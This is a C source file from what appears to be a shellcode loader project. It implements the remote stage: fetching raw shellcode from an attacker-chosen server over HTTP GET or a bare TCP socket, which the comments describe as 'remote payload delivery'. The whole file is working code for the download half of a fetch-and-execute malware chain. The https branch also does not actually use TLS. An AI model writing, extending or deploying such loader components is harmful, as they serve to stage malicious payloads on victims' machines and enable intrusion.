/**
 * @file    remote.c
 * @brief   远程 Shellcode 拉取（HTTP/TCP） / Remote shellcode fetching
 *
 * 通过 HTTP GET 或原始 TCP Socket 从远程服务器获取 shellcode，
 * 用于远程 payload 投递场景。
 * Supports HTTP GET and raw TCP socket connections for remote payload delivery.
 */

#include "remote/remote.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#if SCLOADER_PLATFORM_WINDOWS
    #define WIN32_LEAN_AND_MEAN
    #include <winsock2.h>
    #include <ws2tcpip.h>
    typedef SOCKET socket_t;
    #define SCL_SOCKET_ERROR SOCKET_ERROR
    #define SCL_SOCKET_INVALID INVALID_SOCKET
    #define scl_close_socket(s) closesocket(s)
#else
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <netinet/in.h>
    #include <netdb.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <fcntl.h>
    typedef int socket_t;
    #define SCL_SOCKET_ERROR (-1)
    #define SCL_SOCKET_INVALID (-1)
    #define scl_close_socket(s) close(s)
#endif

/**
 * 发送 HTTP GET 请求并接收响应
 * Send HTTP GET request and receive the response body
 */
static scl_status_t http_get(const char *host, const char *path,
                              unsigned short port,
                              unsigned char **out, size_t *out_size)
{
    /* 创建 TCP Socket / Create TCP socket */
    socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == SCL_SOCKET_INVALID) {
        return SCL_ERR_NETWORK_FAILED;
    }

    /* DNS 解析 / DNS resolution */
    struct hostent *server = gethostbyname(host);
    if (!server) {
        scl_close_socket(sock);
        return SCL_ERR_NETWORK_FAILED;
    }

    /* 连接服务器 / Connect to server */
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr_list[0], (size_t)server->h_length);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        scl_close_socket(sock);
        return SCL_ERR_NETWORK_FAILED;
    }

    /* 构造并发送 HTTP GET 请求 */
    /* Build and send HTTP GET request */
    char request[4096];
    int req_len = snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, SCL_REMOTE_USER_AGENT);

    if (req_len < 0 || (size_t)req_len >= sizeof(request)) {
        scl_close_socket(sock);
        return SCL_ERR_NETWORK_FAILED;
    }

    if (send(sock, request, (size_t)req_len, 0) != req_len) {
        scl_close_socket(sock);
        return SCL_ERR_NETWORK_FAILED;
    }

    /* 接收响应（动态扩容缓冲区） */
    /* Receive response (dynamically growing buffer) */
    size_t capacity = 65536;
    size_t total = 0;
    unsigned char *buffer = (unsigned char *)malloc(capacity);
    if (!buffer) {
        scl_close_socket(sock);
        return SCL_ERR_ALLOC_FAILED;
    }

    int n;
    while ((n = (int)recv(sock, (char *)buffer + total, 4096, 0)) > 0) {
        total += (size_t)n;
        if (total + 4096 > capacity) {
            capacity *= 2;
            unsigned char *tmp = (unsigned char *)realloc(buffer, capacity);
            if (!tmp) {
                free(buffer);
                scl_close_socket(sock);
                return SCL_ERR_ALLOC_FAILED;
            }
            buffer = tmp;
        }
    }

    scl_close_socket(sock);

    if (n < 0) {
        free(buffer);
        return SCL_ERR_NETWORK_FAILED;
    }

    /* 从 HTTP 响应中提取 body（找 CRLFCRLF 分隔符） */
    /* Extract HTTP body (find CRLFCRLF separator) */
    unsigned char *body = NULL;
    size_t body_size = 0;
    for (size_t i = 0; i + 3 < total; i++) {
        if (buffer[i] == '\r' && buffer[i+1] == '\n' &&
            buffer[i+2] == '\r' && buffer[i+3] == '\n') {
            body = buffer + i + 4;
            body_size = total - (i + 4);
            break;
        }
    }

    if (!body) {
        free(buffer);
        return SCL_ERR_NETWORK_FAILED;
    }

    /* 复制 body 到输出缓冲区 / Copy body to output buffer */
    unsigned char *result = (unsigned char *)malloc(body_size);
    if (!result) {
        free(buffer);
        return SCL_ERR_ALLOC_FAILED;
    }

    memcpy(result, body, body_size);
    free(buffer);

    *out = result;
    *out_size = body_size;
    return SCL_OK;
}

/**
 * 解析 URL（支持 http://host:port/path 格式）
 * Parse URL, supporting http://host:port/path format
 *
 * @return 0 成功/success, -1 失败/failure
 */
static int parse_url(const char *url, char *host, size_t host_size,
                     char *path, size_t path_size,
                     unsigned short *port)
{
    if (!url || !host || !path || !port) return -1;

    const char *p = url;
    *port = 80; /* 默认 HTTP 端口 / Default HTTP port */

    /* 跳过协议前缀 / Skip protocol prefix */
    if (strncmp(p, "http://", 7) == 0) {
        p += 7;
    } else if (strncmp(p, "https://", 8) == 0) {
        p += 8;
        *port = 443;
    }

    /* 提取主机名 / Extract host */
    const char *host_start = p;
    const char *host_end = strchr(p, ':');
    const char *path_start = strchr(p, '/');

    if (!host_end || (path_start && host_end > path_start)) {
        host_end = path_start ? path_start : p + strlen(p);
    }

    size_t host_len = (size_t)(host_end - host_start);
    if (host_len >= host_size) return -1;

    memcpy(host, host_start, host_len);
    host[host_len] = '\0';

    /* 解析端口（如有） / Parse port if present */
    if (*host_end == ':') {
        *port = (unsigned short)atoi(host_end + 1);
        const char *port_end = host_end + 1;
        while (*port_end && *port_end >= '0' && *port_end <= '9') port_end++;
        path_start = (*port_end == '/') ? port_end : NULL;
    }

    /* 提取路径 / Extract path */
    if (path_start && *path_start) {
        size_t path_len = strlen(path_start);
        if (path_len >= path_size) return -1;
        memcpy(path, path_start, path_len);
        path[path_len] = '\0';
    } else {
        path[0] = '/';
        path[1] = '\0';
    }

    return 0;
}

scl_status_t scl_remote_fetch(const char *url,
                               unsigned char **out, size_t *out_size)
{
    if (!url || !out || !out_size) {
        return SCL_ERR_INVALID_ARG;
    }

#if SCLOADER_PLATFORM_WINDOWS
    /* Winsock 一次性初始化 / One-time Winsock initialization */
    static bool wsa_initialized = false;
    if (!wsa_initialized) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
        wsa_initialized = true;
    }
#endif

    char host[256];
    char path[4096];
    unsigned short port;

    if (parse_url(url, host, sizeof(host), path, sizeof(path), &port) != 0) {
        return SCL_ERR_INVALID_ARG;
    }

    return http_get(host, path, port, out, out_size);
}

scl_status_t scl_remote_fetch_tcp(const char *host, uint16_t port,
                                   size_t buffer_size,
                                   unsigned char **out, size_t *out_size)
{
    if (!host || !out || !out_size || buffer_size == 0) {
        return SCL_ERR_INVALID_ARG;
    }

    /* 创建 TCP Socket / Create TCP socket */
    socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == SCL_SOCKET_INVALID) {
        return SCL_ERR_NETWORK_FAILED;
    }

    /* DNS 解析 / DNS resolution */
    struct hostent *server = gethostbyname(host);
    if (!server) {
        scl_close_socket(sock);
        return SCL_ERR_NETWORK_FAILED;
    }

    /* 连接服务器 / Connect to server */
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr_list[0], (size_t)server->h_length);

    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        scl_close_socket(sock);
        return SCL_ERR_NETWORK_FAILED;
    }

    /* 接收数据 / Receive data */
    unsigned char *buffer = (unsigned char *)malloc(buffer_size);
    if (!buffer) {
        scl_close_socket(sock);
        return SCL_ERR_ALLOC_FAILED;
    }

    size_t total = 0;
    ssize_t n;
    while (total < buffer_size) {
        size_t remain = buffer_size - total;
        /* recv 第三个参数: POSIX=size_t, Win32=int, 强制转换消除 warning */
        #ifdef _WIN32
        /* Windows: recv 第三参数为 int，需要强转 */
        n = recv(sock, (char *)buffer + total, (int)remain, 0);
#else
        /* POSIX: recv 第三参数为 size_t，无需强转 */
        n = recv(sock, (char *)buffer + total, remain, 0);
#endif
        if (n <= 0) break;
        total += (size_t)n;
    }

    scl_close_socket(sock);

    if (n < 0 && total == 0) {
        free(buffer);
        return SCL_ERR_NETWORK_FAILED;
    }

    *out = buffer;
    *out_size = total;
    return SCL_OK;
}